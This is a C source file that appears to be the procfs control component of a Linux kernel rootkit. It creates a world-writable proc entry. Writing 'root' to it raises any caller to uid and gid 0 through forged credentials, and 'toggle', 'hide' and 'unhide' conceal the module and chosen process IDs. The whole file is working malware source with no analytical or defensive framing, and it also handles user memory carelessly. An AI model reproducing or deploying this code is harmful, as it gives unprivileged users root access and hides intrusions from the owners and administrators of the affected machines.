#include "procfs.h"

static struct proc_dir_entry *proc_rootkit;

extern u8 module_hidden;

static ssize_t rk_proc_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos)
{
    return 0;
}

static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos)
{
    if (strncmp(ubuf, "toggle", MIN(6, count)) == 0)
    {
        if (module_hidden)
            module_unhide();
        else
            module_hide();
    }
    else if (strncmp(ubuf, "root", MIN(4, count)) == 0)
    {
        struct cred *creds = prepare_creds();
        if (creds != NULL)
        {
            creds->uid.val = 0;
            creds->gid.val = 0;
            creds->euid.val = 0;
            creds->egid.val = 0;
        }
        commit_creds(creds);
    }

    else if (strncmp(ubuf, "hide", MIN(4, count)) == 0)
    {
        long pid;
        char *pidstr = kmalloc(sizeof(char) * count - 4, GFP_KERNEL);

        copy_from_user(pidstr, ubuf + 4, count - 4);
        kstrtol(pidstr, 10, &pid);
        kfree(pidstr);

        pr_info("hide %d\n", (pid_t)pid);
        hide_proc(pid);
    }
    else if (strncmp(ubuf, "unhide", MIN(6, count)) == 0)
    {
        long pid;
        char *pidstr = kmalloc(sizeof(char) * count - 6, GFP_KERNEL);

        copy_from_user(pidstr, ubuf + 6, count - 6);
        kstrtol(pidstr, 10, &pid);
        kfree(pidstr);

        pr_info("unhide %d\n", (pid_t)pid);
        unhide_proc(pid);
    }
    return count;
}

static const struct file_operations proc_rootkit_fops = {
    .read = rk_proc_read,
    .write = rk_proc_write,
};

int proc_init(void)
{
    // Create entry for controlling rootkit
    proc_rootkit = proc_create(PROCFILE_NAME, S_IRUGO | S_IWUGO, NULL, &proc_rootkit_fops);
    if (!proc_rootkit)
        return -1;

    return 0;
}

int proc_clean(void)
{
    if (proc_rootkit != NULL)
    {
        proc_remove(proc_rootkit);
        proc_rootkit = NULL;
    }

    return 0;
}